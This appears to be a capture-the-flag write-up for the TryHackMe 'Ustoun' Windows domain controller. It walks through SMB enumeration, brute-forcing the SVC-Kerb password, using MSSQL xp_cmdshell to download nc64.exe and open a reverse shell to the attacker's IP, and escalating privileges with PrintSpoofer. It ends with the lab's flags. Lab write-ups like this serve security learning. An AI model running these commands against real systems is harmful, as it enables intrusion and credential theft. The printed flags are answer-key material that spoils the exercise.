USTOUN
======

# Basic Enumeration 

Using nmap to scan alive ports and services `-Pn` because 
it's windows machine

`nmap --min-rate 300 -Pn -A -oN initial ustoun.thm`


```
PORT     STATE SERVICE        VERSION
53/tcp   open  domain         Simple DNS Plus
88/tcp   open  kerberos-sec   Microsoft Windows Kerberos (server time: 2021-05-17 04:53:58Z)
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
389/tcp  open  ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: DC01
|   NetBIOS_Domain_Name: DC01
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: ustoun.local
|   DNS_Computer_Name: DC.ustoun.local
|   DNS_Tree_Name: ustoun.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-05-17T04:55:06+00:00
| ssl-cert: Subject: commonName=DC.ustoun.local
| Not valid before: 2021-01-31T19:39:34
|_Not valid after:  2021-08-02T19:39:34
|_ssl-date: 2021-05-17T04:55:15+00:00; +55s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 54s, deviation: 0s, median: 54s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-17T04:55:09
|_  start_date: N/A
```

# USER FLAG

SMB is running now scan for if we can read or write to any share

`smbmap -H ustoun.thm -u anonymous`

![smbmap-scan1](/screenshot/smbmap-scan1.png)

IPC$ share is readable so we can enumerate users.

`lookupsid.py anonymous@ustoun.thm`

![lookupsid](/screenshot/lookupsid.png)

Edit list and put users into list for furthur enumeration

```
cat userlist.txt


Administrator
Guest
krbtgt
DC$
SVC-Kerb
```

There are lot of usefull tools in impacket, using tool named `GetNPUsers.py` we gonna look for any available hashes.
unfortunatly we won't find any hashes. 

I try to Bruteforce all users together it take alot time for,
im to bruteforce user `krbtgt` and `SVC-Kerb` separatly.


`crackmapexec smb ustoun.thm -u 'SVC-Kerb' -p /opt/rockyou.txt` 

![crackmapexec](/screenshot/crackmapexec.png)

With this creds i checked available SMB for any file but no luck.

Lets see if same password used in other services also, lets try to access mssql

`mssqlclient.py ustoun.local/SVC-Kerb:superman@ustoun.thm`

login is success, after some reserach found out we can execute command using `EXEC xp_cmdshell` with that help we can get stable shell.

![mssql](/screenshot/mssql.png)

Download and upload nc.exe and get shell.
**[NC](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)**

```
+ sudo python3 -m http.server 80

+ SQL> EXEC xp_cmdshell 'mkdir C:\munaz'

+ SQL> EXEC xp_cmdshell 'powershell.exe -c curl http://$IP/nc64.exe -o C:\munaz\nc64.exe'

+ SQL> EXEC xp_cmdshell 'C:\munaz\nc64.exe -e cmd $IP 443'
```

![upload](/screenshot/upload.png)

make lister and execute the nc.

![nc-shell](/screenshot/nc-shell.png)

# ROOT FLAG

We got shell but we do not have enough permission to read `user.txt` so we need to escalate privilege 

![user-flag](/screenshot/userflag.png)

Lets see what privilege we have using this command `whoami /priv`

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have **SeImpersonatePrivilege** permission, using [PrintSpoofer](https://github.com/dievus/printspoofer) we can escalate privilege

`powershell.exe -c curl http://$IP/PrintSpoofer.exe -o C:\munaz\PrintSpoofer.exe`

using above command upload it then execute it with this command give to root access.

`PrintSpoofer.exe -i -c cmd`

![root-flag](/screenshot/rootflag.png)

# Flags

+ THM{MSSQL_IS_COOL}

+ THM{I_L1kE_gPoS}
